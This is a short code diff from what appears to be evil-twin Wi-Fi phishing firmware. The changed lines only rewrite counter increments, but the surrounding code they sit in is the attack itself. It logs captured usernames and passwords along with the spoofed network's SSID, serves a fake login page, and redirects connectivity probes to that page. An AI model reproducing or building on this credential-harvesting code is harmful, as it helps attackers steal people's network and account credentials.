@@ -98,7 +98,7 @@ static void et_log_cred(const String &u, const String &p, const String &src)
              (unsigned long)(millis() / 1000),
              s_target_ssid, src.c_str(), u.c_str(), p.c_str());
     f.close();
-    s_creds++;
+    s_creds = s_creds + 1;
     strncpy(s_last_user, u.c_str(), sizeof(s_last_user) - 1);
     s_last_user[sizeof(s_last_user) - 1] = '\0';
     s_cred_flash = true;
@@ -121,13 +121,13 @@ static void et_handle_login(void)
 
 static void et_handle_root(void)
 {
-    s_hits++;
+    s_hits = s_hits + 1;
     s_http->send_P(200, "text/html", ET_HTML);
 }
 
 static void et_handle_probe(void)
 {
-    s_hits++;
+    s_hits = s_hits + 1;
     s_http->sendHeader("Location", "/", true);
     s_http->send(302, "text/plain", "");
 }
